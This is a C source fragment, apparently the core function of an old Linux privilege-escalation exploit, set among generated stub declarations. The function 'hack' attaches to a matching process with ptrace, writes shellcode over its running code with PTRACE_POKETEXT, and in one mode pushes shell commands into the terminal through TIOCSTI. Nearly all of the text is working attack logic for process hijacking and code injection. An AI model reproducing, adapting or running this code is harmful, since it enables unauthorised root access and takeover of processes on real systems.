
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct user_regs_struct {int eip; } ;
struct stat {scalar_t__ st_ino; scalar_t__ st_dev; } ;
struct TYPE_2__ {scalar_t__ st_ino; scalar_t__ st_dev; } ;


 scalar_t__ M_DOUBLE ;
 int PTRACE_ATTACH ;
 int PTRACE_DETACH ;
 int PTRACE_GETREGS ;
 int PTRACE_POKETEXT ;
 int PTRACE_SYSCALL ;
 int SIGCONT ;
 int TIOCSTI ;
 int chldpid ;
 int exit (int ) ;
 int fprintf (int ,char*,int) ;
 char* getenv (char*) ;
 int hackpid ;
 int ioctl (int ,int ,int ) ;
 scalar_t__ kill (int,int) ;
 TYPE_1__ me ;
 scalar_t__ mode ;
 scalar_t__ ptrace (int ,int,int ,...) ;
 scalar_t__ shcode ;
 int sprintf (char*,char*,...) ;
 scalar_t__ stat (char*,struct stat*) ;
 int stderr ;
 int strlen (scalar_t__) ;
 int waitpid (int,int ,int ) ;

void hack(int pid)
{
int i;
struct user_regs_struct r;
char b1[100]; struct stat st;
int len=strlen(shcode);

 if(kill(pid, 0)) return;

sprintf(b1, "/proc/%d/exe", pid);
 if(stat(b1, &st)) return;

 if(st.st_ino!=me.st_ino || st.st_dev!=me.st_dev) return;

 if(ptrace(PTRACE_ATTACH, pid, 0, 0)) return;
 while(ptrace(PTRACE_GETREGS, pid, ((void*)0), &r));
fprintf(stderr, "\033[1;33m+ %d\033[0m\n", pid);

 if(ptrace(PTRACE_SYSCALL, pid, 0, 0)) goto fail;
 while(ptrace(PTRACE_GETREGS, pid, ((void*)0), &r));

 for (i=0; i<=len; i+=4)
 if(ptrace(PTRACE_POKETEXT, pid, r.eip+i, *(int*)(shcode+i))) goto fail;

kill(chldpid, 9);
ptrace(PTRACE_DETACH, pid, 0, 0);
fprintf(stderr, "\033[1;32m- %d ok!\033[0m\n", pid);

 if(mode==M_DOUBLE){
 char commands[1024];
 char * c=commands;
 kill(hackpid, SIGCONT);
 sprintf(commands, "\nexport TERM='%s'\nreset\nid\n", getenv("TERM"));
  while(*c) { ioctl(0, TIOCSTI, c++); }

 waitpid(hackpid, 0, 0);
 }

exit(0);

fail:
ptrace(PTRACE_DETACH, pid, 0, 0);
kill(pid, SIGCONT);
}
